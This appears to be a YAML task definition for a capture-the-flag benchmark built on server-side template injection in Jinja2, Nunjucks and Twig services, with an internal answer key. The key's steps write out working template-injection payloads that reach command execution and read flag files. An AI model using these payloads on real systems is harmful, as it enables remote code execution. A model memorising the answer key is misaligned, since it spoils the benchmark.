id: S7BEN-VHARD-009
name: "Server-Side Template Injection Chain"
tier: 2
difficulty: 9
category: vhard
description: "Multi-language web application environment with three template-rendering services."
objective: "Obtain the flags from each template engine service."
flag_pattern: 'S7BEN\{(jinja2_ssti_python_rce|nunjucks_ssti_nodejs_rce|twig_ssti_php_rce)_[0-9a-z]{8}\}'
vulnerabilities:
  - type: Server-Side Template Injection
    cwes: [CWE-94]
owasp_2025: [A03:2025]
difficulty_dimensions:
  recon: medium
  exploit: very_high
  chaining: medium
architecture:
  type: multi-container
  container_count: 3
  services:
    - name: jinja2-app
      port: 5000
      exposed: true
    - name: nunjucks-app
      port: 3000
      exposed: true
    - name: twig-app
      port: 8080
      exposed: true
hints: []
tags: [ssti, template-injection, jinja2, nunjucks, twig, rce, python, nodejs, php]
internal_metadata:
  exploitation_path:
    hints:
      - "Each service renders user-supplied input directly into a template without sanitisation"
      - "Template injection can be detected by injecting mathematical expressions like {{7*7}}"
      - "Jinja2: traverse MRO to access subprocess.Popen or os.system for RCE"
      - "Nunjucks: use range filter and constructor chain to access Function constructor for JS eval"
      - "Twig: use _self.env and filter chains to execute PHP functions"
      - "Error messages often reveal the template engine in use"
    steps:
      - "Identify the template injection parameter on each service (typically a name/query/search field)"
      - "Jinja2 (port 5000): inject {{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}} to achieve RCE and read /app/flag.txt"
      - "Nunjucks (port 3000): inject {{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"cat /app/flag.txt\")')()}} to read the flag"
      - "Twig (port 8080): inject {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /var/www/html/flag.txt')}} to read the flag"
